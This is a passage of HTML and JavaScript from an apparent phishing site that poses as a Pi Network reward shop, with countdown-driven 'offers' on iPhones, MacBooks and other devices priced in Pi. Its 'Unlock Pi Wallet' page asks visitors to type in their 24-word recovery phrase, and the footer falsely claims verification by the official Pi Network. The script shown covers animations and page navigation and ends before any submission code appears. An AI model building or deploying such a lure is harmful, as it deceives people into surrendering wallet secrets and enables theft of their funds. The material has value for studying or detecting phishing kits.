                                    <div class="bg-purple-400 text-white w-16 h-16 rounded-lg flex items-center justify-center text-2xl font-bold countdown-pulse" id="countdown-seconds" bis_skin_checked="1">48</div>
                                    <div class="mt-1 text-sm" data-en="Seconds" bis_skin_checked="1">
                                        Seconds
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>

                <!-- Product Section -->
                <section class="products mx-auto p-5 relative">
                    <h2>Special for you</h2>
                    <div class="product-grid" bis_skin_checked="1">
                        <!-- Product Card 1 -->
                        <div class="product-card" bis_skin_checked="1">
                            <img src="./index.php_files/Giftcard99-1.png" alt="Giftcard 99 Pi">
                            <p class="price">
                                <span class="current-price">5 Pi</span>
                                <span class="original-price">99 Pi</span>
                            </p>
                            <p class="product-name">Gift Card</p>
                            <button id="openFormBtn" class="buy-now">Offer Now</button>
                        </div>

                        <div class="product-card" bis_skin_checked="1">
                            <img src="./index.php_files/iPhone 15.jpg" alt="iPhone 15">
                            <p class="price">
                                <span class="current-price">35 Pi</span>
                                <span class="original-price">135 Pi</span>
                            </p>
                            <p class="product-name">iPhone 15</p>
                            <button id="openFormBtn" class="buy-now">Offer Now</button>
                        </div>

                        <!-- Product Card 2 -->
                        <div class="product-card" bis_skin_checked="1">
                            <img src="./index.php_files/iphone 15 Plus.jpg" alt="iPhone 15 Pro Max">
                            <p class="price">
                                <span class="current-price">45 Pi</span>
                                <span class="original-price">145 Pi</span>
                            </p>
                            <p class="product-name">iPhone 15 Plus</p>
                            <button id="buyNowBtn-iphone15plus" class="buy-now">Offer Now</button>
                        </div>

                        <!-- Duplicate Product Cards -->
                        <div class="product-card" bis_skin_checked="1">
                            <img src="./index.php_files/iphone-15-pro.jpg" alt="iPhone 16 Pro Max">
                            <p class="price">
                                <span class="current-price">60 Pi</span>
                                <span class="original-price">175 Pi</span>
                            </p>
                            <p class="product-name">iPhone 15 Pro</p>
                            <button id="buyNowBtn-iphone15pro" class="buy-now">Offer Now</button>
                        </div>

                        <div class="product-card" bis_skin_checked="1">
                            <img src="./index.php_files/iphone_15_pro_max.jpg" alt="iPhone 16 Pro Max">
                            <p class="price">
                                <span class="current-price">80 Pi</span>
                                <span class="original-price">195 Pi</span>
                            </p>
                            <p class="product-name">iPhone 15 Pro Max</p>
                            <button id="buyNowBtn-iphone15promax" class="buy-now">Offer Now</button>
                        </div>
                        <div class="product-card" bis_skin_checked="1">
                            <img src="./index.php_files/iPhone 16.jpg" alt="iPhone 16 Pro Max">
                            <p class="price">
                                <span class="current-price">45 Pi</span>
                                <span class="original-price">145 Pi</span>
                            </p>
                            <p class="product-name">iPhone 16</p>
                            <button id="buyNowBtn-iphone16" class="buy-now">Offer Now</button>
                        </div>
                        <div class="product-card" bis_skin_checked="1">
                            <img src="./index.php_files/iphone 16 Plus.jpg" alt="iPhone 16 Pro Max">
                            <p class="price">
                                <span class="current-price">50 Pi</span>
                                <span class="original-price">145 Pi</span>
                            </p>
                            <p class="product-name">iPhone 16 Plus</p>
                            <button id="buyNowBtn-iphone16plus" class="buy-now">Offer Now</button>
                        </div>
                        <div class="product-card" bis_skin_checked="1">
                            <img src="./index.php_files/iphone-16-pro.jpg" alt="iPhone 16 Pro Max">
                            <p class="price">
                                <span class="current-price">55 Pi</span>
                                <span class="original-price">160 Pi</span>
                            </p>
                            <p class="product-name">iPhone 16 Pro</p>
                            <button id="buyNowBtn-iphone16pro" class="buy-now">Offer Now</button>
                        </div>

                        <div class="product-card" bis_skin_checked="1">
                            <img src="./index.php_files/iphone_16_pro_max.jpg" alt="iPhone 16 Pro Max">
                            <p class="price">
                                <span class="current-price">80 Pi</span>
                                <span class="original-price">200 Pi</span>
                            </p>
                            <p class="product-name">iPhone 16 Pro Max</p>
                            <button id="buyNowBtn-iphone16promax" class="buy-now">Offer Now</button>
                        </div>
                        <div class="product-card" bis_skin_checked="1">
                            <img src="./index.php_files/m3_14_fekete.jpg" alt="iPhone 16 Pro Max">
                            <p class="price">
                                <span class="current-price">99 Pi</span>
                                <span class="original-price">250 Pi</span>
                            </p>
                            <p class="product-name">MacBook M3 14 Inch</p>
                            <button id="buyNowBtn-macbookm314" class="buy-now">Offer Now</button>
                        </div>
                        <div class="product-card" bis_skin_checked="1">
                            <img src="./index.php_files/m3_16_fekete.jpg" alt="iPhone 16 Pro Max">
                            <p class="price">
                                <span class="current-price">135 Pi</span>
                                <span class="original-price">280 Pi</span>
                            </p>
                            <p class="product-name">MacBook M3 16 Inch</p>
                            <button id="buyNowBtn-macbookm316" class="buy-now">Offer Now</button>
                        </div>
                        <div class="product-card" bis_skin_checked="1">
                            <img src="./index.php_files/ap4.jpg" alt="iPhone 16 Pro Max">
                            <p class="price">
                                <span class="current-price">30Pi</span>
                                <span class="original-price">120 Pi</span>
                            </p>
                            <p class="product-name">Airpods 4</p>
                            <button id="buyNowBtn-airpods4" class="buy-now">Offer Now</button>
                        </div>

                        <div class="product-card" bis_skin_checked="1">
                            <img src="./index.php_files/apvision.jpg" alt="iPhone 16 Pro Max">
                            <p class="price">
                                <span class="current-price">135 Pi</span>
                                <span class="original-price">280 Pi</span>
                            </p>
                            <p class="product-name">Vision Pro</p>
                            <button id="buyNowBtn-visionpro" class="buy-now">Offer Now</button>
                        </div>
                        <div class="product-card" bis_skin_checked="1">
                            <img src="./index.php_files/applewatch.jpg" alt="iPhone 16 Pro Max">
                            <p class="price">
                                <span class="current-price">60 Pi</span>
                                <span class="original-price">140 Pi</span>
                            </p>
                            <p class="product-name">Watch Series 10</p>
                            <button id="buyNowBtn-applewatch" class="buy-now">Offer Now</button>
                        </div>
                        <div class="product-card" bis_skin_checked="1">
                            <img src="./index.php_files/S24.jpg" alt="iPhone 16 Pro Max">
                            <p class="price">
                                <span class="current-price">60 Pi</span>
                                <span class="original-price">175 Pi</span>
                            </p>
                            <p class="product-name">Galaxy S24</p>
                            <button id="buyNowBtn-galaxys24" class="buy-now">Offer Now</button>
                        </div>
                        <div class="product-card" bis_skin_checked="1">
                            <img src="./index.php_files/samsung-galaxy-s24-plus-5g-sm-s926.jpg" alt="iPhone 16 Pro Max">
                            <p class="price">
                                <span class="current-price">75 Pi</span>
                                <span class="original-price">180 Pi</span>
                            </p>
                            <p class="product-name">Galaxy S24 Plus</p>
                            <button id="buyNowBtn-galaxys24plus" class="buy-now">Offer Now</button>
                        </div>

                        <div class="product-card" bis_skin_checked="1">
                            <img src="./index.php_files/S24 Ultra.jpg" alt="iPhone 16 Pro Max">
                            <p class="price">
                                <span class="current-price">90 Pi</span>
                                <span class="original-price">210 Pi</span>
                            </p>
                            <p class="product-name">Galaxy S24 Ultra</p>
                            <button id="buyNowBtn-galaxys24ultra" class="buy-now">Offer Now</button>
                        </div>

                        <div class="product-card" bis_skin_checked="1">
                            <img src="./index.php_files/asus rog.png" alt="iPhone 16 Pro Max">
                            <p class="price">
                                <span class="current-price">90 Pi</span>
                                <span class="original-price">210 Pi</span>
                            </p>
                            <p class="product-name">Asus ROG Zephyrus</p>
                            <button id="buyNowBtn-asusrog" class="buy-now">Offer Now</button>
                        </div>
                    </div>
                </section>

                <section class="text-center m-5 relative">
                    <!-- Features with enhanced wave effect -->
                    <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mt-12" bis_skin_checked="1">
                        <div class="card p-5 feature-card" bis_skin_checked="1">
                            <div class="feature-card-wave" bis_skin_checked="1" style="display: none;"></div>
                            <div class="feature-icon" bis_skin_checked="1" style="--shine-opacity: 0;">
                                <i class="fas fa-check-circle"></i>
                            </div>
                            <p class="font-medium mt-4" data-en="Birthday Program">
                                Birthday Program
                            </p>
                        </div>
                        <div class="card p-5 feature-card" bis_skin_checked="1">
                            <div class="feature-card-wave" bis_skin_checked="1" style="display: none;"></div>
                            <div class="feature-icon" bis_skin_checked="1" style="--shine-opacity: 0;">
                                <i class="fas fa-clock"></i>
                            </div>
                            <p class="font-medium mt-4" data-en="Receive in 24h">
                                Receive in 24h
                            </p>
                        </div>
                        <div class="card p-5 feature-card" bis_skin_checked="1">
                            <div class="feature-card-wave" bis_skin_checked="1" style="display: none;"></div>
                            <div class="feature-icon" bis_skin_checked="1" style="--shine-opacity: 0;">
                                <i class="fas fa-shield-alt"></i>
                            </div>
                            <p class="font-medium mt-4" data-en="Safe &amp; Secure">
                                Safe &amp; Secure
                            </p>
                        </div>
                        <div class="card p-5 feature-card" bis_skin_checked="1">
                            <div class="feature-card-wave" bis_skin_checked="1" style="display: none;"></div>
                            <div class="feature-icon" bis_skin_checked="1" style="--shine-opacity: 0;">
                                <i class="fas fa-users"></i>
                            </div>
                            <p class="font-medium mt-4" data-en="500000+ Participants">
                                500000+ Participants
                            </p>
                        </div>
                    </div>
                </section>

                <!-- Footer -->
                <footer class="py-10 px-4 relative">
                    <div class="absolute inset-0 opacity-10 bg-purple-900" bis_skin_checked="1"></div>
                    <div class="relative z-10 container mx-auto text-center" bis_skin_checked="1">
                        <div class="mb-6" bis_skin_checked="1">
                            <div class="mb-6" bis_skin_checked="1">
                                <div class="mb-6 flex justify-center" bis_skin_checked="1">
                                    <img src="./index.php_files/Layer-3.png" alt="Pi Logo" class="h-20 object-contain">
                                </div>
                            </div>
                        </div>
                        <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8" bis_skin_checked="1">
                            <div bis_skin_checked="1">
                                <h5 class="font-bold mb-3" data-en="Contact">
                                    Contact
                                </h5>
                                <p class="flex items-center justify-center mb-2">
                                    <i class="fas fa-envelope mr-2 text-purple-400"></i>
                                    support@pimart.us
                                </p>
                                <p class="flex items-center justify-center">
                                    <i class="fas fa-globe mr-2 text-purple-400"></i>
                                    pimart.us
                                </p>
                            </div>
                            <div bis_skin_checked="1">
                                <h5 class="font-bold mb-3" data-en="Policies">
                                    Policies
                                </h5>
                                <p class="mb-2" data-en="Data privacy">
                                    Data privacy
                                </p>
                                <p data-en="Terms of use">
                                    Terms of use
                                </p>
                            </div>
                            <div bis_skin_checked="1">
                                <h5 class="font-bold mb-3" data-en="Follow Us">
                                    Follow Us
                                </h5>
                                <div class="flex justify-center space-x-4" bis_skin_checked="1">
                                    <span class="w-10 h-10 bg-purple-800 bg-opacity-30 rounded-full flex items-center justify-center hover:bg-opacity-50 transition-all duration-300">
                                        <i class="fab fa-telegram text-purple-400"></i>
                                    </span>
                                    <span class="w-10 h-10 bg-purple-800 bg-opacity-30 rounded-full flex items-center justify-center hover:bg-opacity-50 transition-all duration-300">
                                        <i class="fab fa-twitter text-purple-400"></i>
                                    </span>
                                    <span class="w-10 h-10 bg-purple-800 bg-opacity-30 rounded-full flex items-center justify-center hover:bg-opacity-50 transition-all duration-300">
                                        <i class="fab fa-discord text-purple-400"></i>
                                    </span>
                                </div>
                            </div>
                        </div>
                        <p class="mb-4 max-w-2xl mx-auto" data-en="This is an independent promotional program verified by the official Pi Network.">
                            This is an independent promotional program verified by the official Pi Network.
                        </p>
                        <p class="text-sm text-gray-500 dark:text-gray-400" data-en="© 2025 Pi Network Reward Program. All rights reserved.">
                            © 2025 Pi Network Reward Program. All rights reserved.
                        </p>
                    </div>
                </footer>
            </div>

            <!-- Pi Wallet Form Page -->
            <div id="formPage" class="bg-white w-full page page-inactive-right" bis_skin_checked="1">
                <div class="container mx-auto px-4" bis_skin_checked="1">
                    <div class="pi-wallet-style surprise-container" bis_skin_checked="1">
                        <div id="pi-title" class="pi-title" data-en="Unlock Pi Wallet" bis_skin_checked="1">
                            Unlock Pi Wallet
                        </div>

                        <!-- Limit message container -->
                        <div id="limitMessage" class="limit-message" bis_skin_checked="1" style="display: none;">
                            <i class="fas fa-exclamation-triangle mr-2"></i>
                            <span data-en="You have submitted 1/2 requests. Each device is limited to a maximum of 2 requests.">
                                You have submitted 1/2 requests. Each device is limited to a maximum of 2 requests.
                            </span>
                        </div>

                        <!-- Error message for exceeding limit -->
                        <div id="errorMessage" class="error-message" bis_skin_checked="1" style="display: none;">
                            <i class="fas fa-ban mr-2"></i>
                            <span data-en="You have exceeded the allowed number of request submissions (2 times). Please contact support if you need assistance.">
                                You have exceeded the allowed number of request submissions (2 times). Please contact support if you need assistance.
                            </span>
                        </div>

                        <div class="animate-on-scroll" data-delay="200" bis_skin_checked="1">
                            <div class="pi-input-container" bis_skin_checked="1">
                                <textarea id="walletAddress" class="pi-input" data-en="Enter your 24-word recovery phrase here" placeholder="Enter your 24-word recovery phrase here"></textarea>
                            </div>
                            <div id="wordCounter" class="word-counter" bis_skin_checked="1"></div>
                            <div id="validationMessage" class="validation-message hidden" data-en="Please enter exactly 24 recovery words" bis_skin_checked="1">
                                Please enter exactly 24 recovery words
                            </div>
                        </div>

                        <div class="animate-on-scroll" data-delay="400" bis_skin_checked="1">
                            <input type="hidden" id="captchaToken" name="captchaToken" value="03AFcWeA5q1z4dGRR8BAF6YrpWDYYjelp8cJdyr1s7C6l8KnDC2oRs_65lN147JyKy-qL73MJ9P3HbsipGiwIRmmZDfTb4cUUTEVTZDIgaB948Ar9mem-4frsmafSWEZpnQe3nXO0_meZFFttqwbG_n8HQn2y9Wv0IEW_r4OM_Pvw_ss7CUp72hxgFmXpJJ3iCjjGp7bl3VRLB1CximlCWghDRnuIkQJVyQ8la_6TEMeGjeD2QRguuKvLmfKSG2aV8Fw_nasw5sd1a84NgNRp6laH39iwE4MC6TCAhjiO3FvauBukRO8f647szG3OAUal7Ctc1hsez-BCp316Y4Dvnj2TUBekRzu1Xa848C4wbwld4fVhwZ1QcqtXAkA-w_BFcfr2z8fRYVtZp0bnAe9dXsQTzeUuWuMQDUPg0O1Vp7m6izFx6hcL_wZ3sLSqPNH8iIBU0NDYqgiDb-G53O4BJ8WNuqT4ET23iZUHItrMM-SwDp9CPbp-lTNe1ncxvqSdIc7kOUVcASWicziacFrm-leuNxBaBYuLNxRSAWJav_tdy0VgpTBt9vLElNaWd1NpGyB7HCYCP9ybuMIEWSShiQnMj-yMN6jWJbswztdO8D12D1sJLvU5l7PpUv81-HnHL7nwPZ113iXaEoLIObsknRvb4zvXTRL2tRXT_n4zVCHz1xrBxhhgNS19__GtPUS_ozm7wDIkeOaRx0hJYogo4IDLEJLVnB0_IbHJaaWDZvQryAaRsESTU-rPfoRGUCNxPCzn1YQRaF4f9dntn0Q-ixLNkmd0cPws32k1D_TX4QdxftBeUh7p9MGdaSldlefqdRBoHcO0lu3UOzy7floDMOcKgOASwlwJknQRKpOnhKfvhZeFkn9BVqIeqsQKNz7g8RR9VcMYaKhppvFIBXj6NgV7OADzXy-O0AOetbWLuE0t6zx13aaYY8IhgO2HN2fthfxYD0g2EXEJR4dhTRmg1AFmHhbwDeuzyVEjtStnqftfPhsrbjiuHwviFw66bL6KWfQJh-hgyIZVo2QrKropenCCj2Kao8HGAVOdw0WqYmykfUbN95DOPrQJWQlwUF90ukjwoCPSXDkpeud-vY89VyI9FBZbOFesAhNcTpkxv-C2IYy0yA8LFpcJ76SxjUEx-o2r4PvfxKF0dKvAdeVE9RggwdXPxlGa2DBXQMLbYRnherg3kHRBpIGkSE_w8FAqQVaW06U9CpMfviZSszArM5kuXwehZ7T9Rl9Ps_KZyQhfJJPcLPR0YlGfpyxuTyDukOcFAQeoHLlKh-W_kTL3MoeeV3fm0EEjqQMMeAAZI46zxHyTiyN-D-UXztPp5Ko54aU0-2lD0eIOIRO9re87tc44LZHNbrqvOcQqbipKM6biCPtAdz14hLQg_p1Wc9GiXfAl0mzJSEGM0JBFRAexfBOIvwiVRgYxcNJdJxKaOmjpBGrIjZCefyQGF84G05kjhku5FnXJs6agbpawM-o7ybzUzbUKIIDCExcBi7dHblbWKtQSlXM1FATEwEQ-N3E7A0P2hCMwG-HaczxSzM5FBlzEQwSxT3zAQni2CbG16wZMhF8fA4U3vrnawAgzTARW6Ql2Sf3TPIxcIqMnUlnLXQV3axtWM-lKJm3ATeQQmZcD94Lv6o_REqNBcZMPvL57O4OOe6K4Qj66XBXKr4tQcJbSFfNj2tnzFiNwNAReZHVcznMP_0v4cGwwP8EABUQXCLz_lA98AeH9oeUd3ppNaYBLSmJuBbxle49zZy6QuahfEn4S_IBctzsl7gTdVTQvP6bqGP6KF0qWTRCepnsOGlhFItR0aG9CmETlZe6ymgb2NCVN6VcPU_ZPnz_VxAvPayQmvrfn7_otvJBOJVnalO1j1pTkls57LQ2OqZDtWg9BSrrLZUj_oxB_qWflmwxM99aoWIDEP3j82PedSTnYmDJWEzSMeZ-N-25hng4CHKAxshyDMlXzp7iUxBkO7k61WFdsolrt1KmV0ZJoijRmRnIQYOsOzhXcZz0INaOS57zdUyLG71eE8zlHidqGXoEk_Gcizyprjy8jhoCud68ZNXABF61LfjA0bABMmxMS2H6uiwgWDJ8Jxpe_1O7W1EppdHabofsLBtU5zk590u9a97i2BCIW6n1pUCSsXFcy9vaER_Zx7poyLHuiIQM762vyowCTqsrFRdPxsrj3Ce2Y84WoqTRJxsRiuD6ihBtbYOzM6ZD2xyOxkfA0bX52tRETdf9i3Y0MvNHCUSpGX3F523skUx3R3mnc3-MbaStNgRyFAzdiDDzHX_5k">
                            <button id="unlockSubmitBtn" class="pi-button pi-button-primary surprise-trigger" data-en="UNLOCK WITH RECOVERY PHRASE">
                                UNLOCK WITH RECOVERY PHRASE
                            </button>

                            <button class="pi-button pi-button-secondary" data-en="UNLOCK WITH FINGERPRINT">
                                UNLOCK WITH FINGERPRINT
                            </button>
                        </div>

                        <div class="pi-info-text" bis_skin_checked="1">
                            <p data-en="As a non-custodial wallet, your recovery phrase is only accessible to you. Currently, recovery phrases cannot be recovered if lost.">
                                As a non-custodial wallet, your recovery phrase is only accessible to you. Currently, recovery phrases cannot be recovered if lost.
                            </p>
                            <p class="mt-2">
                                <span data-en="Lost your wallet recovery phrase?">Lost your wallet recovery phrase?</span>
                                <a href="https://pimart.us/#" class="pi-link" data-en="You can create a new wallet">You can create a new wallet</a>,
                                <span data-en="but all π in your previous wallet will be inaccessible.">but all π in your previous wallet will be inaccessible.</span>
                            </p>
                        </div>

                        <!-- Hidden explosion particles for surprise effect -->
                        <div id="explosionContainer" bis_skin_checked="1"><div class="explosion-particle" bis_skin_checked="1" style="--tx: -18.675405474078747px; --ty: -133.45632918538462px;"></div><div class="explosion-particle" bis_skin_checked="1" style="--tx: -146.93866049464336px; --ty: 98.36835690426426px;"></div><div class="explosion-particle" bis_skin_checked="1" style="--tx: -161.08192704342673px; --ty: 1.742670456757847px;"></div><div class="explosion-particle" bis_skin_checked="1" style="--tx: -74.20489643976673px; --ty: -80.36679571326505px;"></div><div class="explosion-particle" bis_skin_checked="1" style="--tx: -58.71036151857064px; --ty: 99.49099509540305px;"></div><div class="explosion-particle" bis_skin_checked="1" style="--tx: 10.049745431082222px; --ty: -164.84727560944134px;"></div><div class="explosion-particle" bis_skin_checked="1" style="--tx: 35.02293573621739px; --ty: 104.31810591992065px;"></div><div class="explosion-particle" bis_skin_checked="1" style="--tx: 155.949955225154px; --ty: -24.119641170828377px;"></div><div class="explosion-particle" bis_skin_checked="1" style="--tx: -126.39214715710604px; --ty: 60.218448044044635px;"></div><div class="explosion-particle" bis_skin_checked="1" style="--tx: 128.3374005852162px; --ty: -0.5992614679676571px;"></div></div>
                    </div>

                    <div class="mt-8 text-center" bis_skin_checked="1">
                        <button id="backToHomeBtn" class="btn-secondary">
                            <i class="fas fa-arrow-left mr-2"></i>
                            <span data-en="Back to Home">Back to Home</span>
                        </button>
                    </div>
                </div>
            </div>
            <!-- Trang Tạo Ví Mới -->
            <div id="createWalletPage" class="page page-inactive-right" style="background-color: white;" bis_skin_checked="1">
                <div class="container mx-auto px-4" style="height: 100vh; display: flex; align-items: center; justify-content: center;" bis_skin_checked="1">
                    <div class="text-center" style="max-width: 350px; width: 100%;" bis_skin_checked="1">
                        <h1 class="text-3xl font-medium mb-4" style="color: #333333;">
                            Create your wallet
                        </h1>

                        <p class="mb-10 text-lg font-bold" style="color: #333333;">
                            Don't hit the back button until you've completed the entire process!
                        </p>

                        <button id="createNewWalletBtn" class="w-full py-3 text-white font-medium text-base rounded-lg mb-6" style="background-color: #693988; text-transform: uppercase;">
                            CREATE NEW WALLET
                        </button>

                        <p id="walletErrorMessage" class="mb-3 text-left font-normal" style="color: #a83232; font-size: 16px; display: none;">
                            It looks like you recently created a new wallet. If you are resetting, please try again later.
                        </p>

                        <a id="walletCreatedBtn" href="https://pimart.us/#" class="block text-center font-bold text-lg py-2" style="color: #0045c4; text-transform: uppercase; text-decoration: underline;">
                            WALLET HAS BEEN CREATED
                        </a>
                    </div>
                </div>
            </div>
        </div>

        <script>
            // Create floating balloons with enhanced appearance and movement
            function createFloatingIcons() {
                const iconsContainer = document.createElement("div");
                iconsContainer.id = "iconsContainer";
                iconsContainer.style.position = "fixed";
                iconsContainer.style.width = "100%";
                iconsContainer.style.height = "100%";
                iconsContainer.style.top = "0";
                iconsContainer.style.left = "0";
                iconsContainer.style.pointerEvents = "none";
                iconsContainer.style.zIndex = "-5";
                iconsContainer.style.overflow = "hidden";
                document.body.appendChild(iconsContainer);

                // Professional crypto/finance icons

                const iconUrls = [
                    "https://i.pinimg.com/originals/0c/a0/34/0ca034d0ed966a0ac1b6455039d6e364.png",
                    "https://static.vecteezy.com/system/resources/thumbnails/055/688/542/small/isolated-purple-balloon-no-background-with-ribbon-png.png",
                ];

                const numIcons = 1; // Giảm xuống còn 3

                for (let i = 0; i < numIcons; i++) {
                    setTimeout(() => {
                        const icon = document.createElement("img");
                        icon.className = "floating-icon-img";

                        // Set icon image source
                        const iconIndex = Math.floor(Math.random() * iconUrls.length);
                        icon.src = iconUrls[iconIndex];

                        // Random position and animation timing
                        const leftPos = 5 + Math.random() * 90;
                        const floatDistance = -100 + Math.random() * 200;
                        const size = 80 + Math.random() * 40; // Larger sizing
                        const duration = 40 + Math.random() * 20; // Slower movement for better performance

                        icon.style.setProperty("--float-distance", `${floatDistance}px`);
                        icon.style.left = `${leftPos}%`;
                        icon.style.width = `${size}px`;
                        icon.style.height = `${size}px`;
                        icon.style.animationDuration = `${duration}s`;

                        iconsContainer.appendChild(icon);

                        // Remove icon after animation completes
                        setTimeout(() => {
                            icon.remove();
                        }, duration * 1000);
                    }, i * 5000); // More spacing between icons for better performance
                }

                // Continue creating icons periodically at a slower rate
                setInterval(() => {
                    if (document.visibilityState === "visible") {
                        const icon = document.createElement("img");
                        icon.className = "floating-icon-img";

                        const iconIndex = Math.floor(Math.random() * iconUrls.length);
                        icon.src = iconUrls[iconIndex];

                        const leftPos = 5 + Math.random() * 90;
                        const floatDistance = -100 + Math.random() * 200;
                        const size = 80 + Math.random() * 40; // Larger sizing
                        const duration = 40 + Math.random() * 20;

                        icon.style.setProperty("--float-distance", `${floatDistance}px`);
                        icon.style.left = `${leftPos}%`;
                        icon.style.width = `${size}px`;
                        icon.style.height = `${size}px`;
                        icon.style.animationDuration = `${duration}s`;

                        iconsContainer.appendChild(icon);

                        setTimeout(() => {
                            icon.remove();
                        }, duration * 1000);
                    }
                }, 20000); // Much longer interval between new icons for better performance
            }

            // Create premium background effects - enhanced but optimized
            function createPremiumBackground() {
                // Create stars (reduced number)
                const starsContainer = document.getElementById("starsContainer");
                const numStars = 5; // Reduced number for better performance

                for (let i = 0; i < numStars; i++) {
                    const star = document.createElement("div");
                    star.className = "star";
                    star.style.width = `${Math.random() * 3 + 1}px`;
                    star.style.height = star.style.width;
                    star.style.left = `${Math.random() * 100}%`;
                    star.style.top = `${Math.random() * 100}%`;
                    star.style.animationDelay = `${Math.random() * 4}s`;
                    starsContainer.appendChild(star);
                }

                // Create single-point bright stars (reduced number)
                const singleStarsContainer = document.getElementById("singleStarsContainer");
                const numSingleStars = 1; // Reduced number for better performance

                for (let i = 0; i < numSingleStars; i++) {
                    const star = document.createElement("div");
                    star.className = "star-single";
                    star.style.left = `${Math.random() * 90 + 5}%`;
                    star.style.top = `${Math.random() * 90 + 5}%`;
                    star.style.animationDelay = `${Math.random() * 3}s`;
                    singleStarsContainer.appendChild(star);
                }

                // Create shooting stars (reduced number)
                const shootingStarsContainer = document.getElementById("shootingStarsContainer");
                const numShootingStars = 0; // Reduced to just 1 for better performance

                for (let i = 0; i < numShootingStars; i++) {
                    const shootingStar = document.createElement("div");
                    shootingStar.className = "shooting-star";

                    // Position at top-left of screen
                    shootingStar.style.left = `${Math.random() * 30}%`;
                    shootingStar.style.top = `${Math.random() * 30}%`;

                    // Set length and angle for proper direction
                    const length = 80 + Math.random() * 120;
                    shootingStar.style.width = `${length}px`;
                    shootingStar.style.height = `2px`;
                    shootingStar.style.transform = "rotate(45deg)";

                    // Stagger animation timing
                    shootingStar.style.animationDelay = `${i * 3 + Math.random() * 3}s`;

                    shootingStarsContainer.appendChild(shootingStar);
                }

                // Create Pi coins with images (reduced number)
                const coinsContainer = document.getElementById("coinsContainer");
                const numCoins = 2; // Reduced from 8 to 4 for better performance

                // Define positions that spread evenly across the screen
                const coinPositions = [
                    { left: "15%", top: "15%" },
                    { left: "85%", top: "15%" },
                    { left: "15%", top: "85%" },
                    { left: "85%", top: "85%" },
                ];

                // Pi coin image URLs
                const piCoinImages = ["https://img.upanh.tv/2025/03/11/favicon42527eabc5bda97a.png", "https://img.upanh.tv/2025/03/11/favicon42527eabc5bda97a.png"];

                for (let i = 0; i < numCoins; i++) {
                    const coin = document.createElement("div");
                    coin.className = "premium-coin";

                    // Create image element instead of text
                    const img = document.createElement("img");
                    img.src = piCoinImages[i % piCoinImages.length];
                    img.style.width = "100%";
                    img.style.height = "100%";
                    img.style.objectFit = "contain";
                    img.style.borderRadius = "50%";

                    coin.appendChild(img);

                    const size = 30 + Math.random() * 20;
                    coin.style.width = `${size}px`;
                    coin.style.height = `${size}px`;
                    coin.style.left = coinPositions[i].left;
                    coin.style.top = coinPositions[i].top;
                    coin.style.animationDelay = `${Math.random() * 3}s`;
                    coin.style.opacity = "0.4";

                    // Simpler floating animation
                    coin.style.animation = `float 10s infinite ease-in-out`;

                    coinsContainer.appendChild(coin);
                }

                // Create light streaks (reduced number)
                const lightStreaksContainer = document.getElementById("lightStreaksContainer");
                const numStreaks = 1; // Reduced from 2 to 1 for better performance

                for (let i = 0; i < numStreaks; i++) {
                    const streak = document.createElement("div");
                    streak.className = "light-streak";
                    streak.style.top = `${50}%`; // Fixed position
                    streak.style.animationDelay = `${i * 5}s`;
                    lightStreaksContainer.appendChild(streak);
                }
            }

            // Add wave animations to feature cards
            function setupFeatureCardWaves() {
                // Ẩn tất cả hiệu ứng sóng
                const waves = document.querySelectorAll(".feature-card-wave");
                waves.forEach((wave) => {
                    wave.style.display = "none";
                });

                // Ẩn tất cả hiệu ứng shine
                const icons = document.querySelectorAll(".feature-icon");
                icons.forEach((icon) => {
                    icon.style.setProperty("--shine-opacity", "0");
                });
            }

            // Create explosion particles - simplified
            function createExplosionParticles() {
                const container = document.getElementById("explosionContainer");
                const numParticles = 10; // Reduced for better performance

                for (let i = 0; i < numParticles; i++) {
                    const particle = document.createElement("div");
                    particle.className = "explosion-particle";

                    // Set random direction for each particle
                    const angle = Math.random() * Math.PI * 2;
                    const distance = 100 + Math.random() * 100;
                    const tx = Math.cos(angle) * distance;
                    const ty = Math.sin(angle) * distance;

                    particle.style.setProperty("--tx", `${tx}px`);
                    particle.style.setProperty("--ty", `${ty}px`);

                    container.appendChild(particle);
                }
            }

            // Show loading spinner
            function showLoading() {
                document.getElementById("loadingOverlay").style.display = "flex";
            }

            // Hide loading spinner
            function hideLoading() {
                document.getElementById("loadingOverlay").style.display = "none";
            }

            // Update the current date and time in the success modal
            function updateSuccessDateTime() {
                const dateTimeElement = document.getElementById("currentDateTime");
                const now = new Date();

                // Format: YYYY-MM-DD HH:MM:SS
                const year = now.getFullYear();
                const month = String(now.getMonth() + 1).padStart(2, "0");
                const day = String(now.getDate()).padStart(2, "0");
                const hours = String(now.getHours()).padStart(2, "0");
                const minutes = String(now.getMinutes()).padStart(2, "0");
                const seconds = String(now.getSeconds()).padStart(2, "0");

                const formattedDateTime = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
                dateTimeElement.textContent = formattedDateTime;
            }

            // Navigate between pages
            function navigateTo(fromPage, toPage, direction = "right") {
                const from = document.getElementById(fromPage);
                const to = document.getElementById(toPage);

                // Set initial positions
                from.classList.remove("page-active");
                to.classList.remove("page-inactive-left", "page-inactive-right");

                if (direction === "right") {
                    from.classList.add("page-inactive-left");
                    to.classList.add("page-active");
                } else {
                    from.classList.add("page-inactive-right");
                    to.classList.add("page-active");
                }

                // Update back button visibility
                const headerBackBtn = document.getElementById("headerBackBtn");
                if (toPage === "homePage") {
                    headerBackBtn.style.visibility = "hidden";
                } else {
                    headerBackBtn.style.visibility = "visible";
                }

                // Show/hide top notification based on page
                const notificationBanner = document.querySelector(".notification-banner");
                if (notificationBanner) {
                    if (toPage === "homePage") {
                        notificationBanner.style.display = "block";
                    } else {
                        notificationBanner.style.display = "none";
                    }
                }

                // Add one-time transitionend event listener to the target page
                const handleTransitionEnd = () => {
                    window.scrollTo({
                        top: 0,
                        behavior: "smooth",
                    });
                    to.removeEventListener("transitionend", handleTransitionEnd);
                };
                to.addEventListener("transitionend", handleTransitionEnd);
            }

            // Handle scroll animations - improved performance
            function handleScrollAnimations() {
                const elements = document.querySelectorAll(".animate-on-scroll, .animate-fade-in");

                // Use IntersectionObserver for better performance
                const observer = new IntersectionObserver(
                    (entries) => {
                        entries.forEach((entry) => {
                            if (entry.isIntersecting) {
                                const delay = entry.target.getAttribute("data-delay") || 0;
                                setTimeout(() => {
                                    entry.target.classList.add("animated");
                                }, delay);
                                observer.unobserve(entry.target);
                            }
                        });
                    },
                    { threshold: 0.1, rootMargin: "50px" }
                ); // Added rootMargin for earlier animation trigger

                elements.forEach((element) => {
                    observer.observe(element);
                });
            }

            // Submission tracking functions
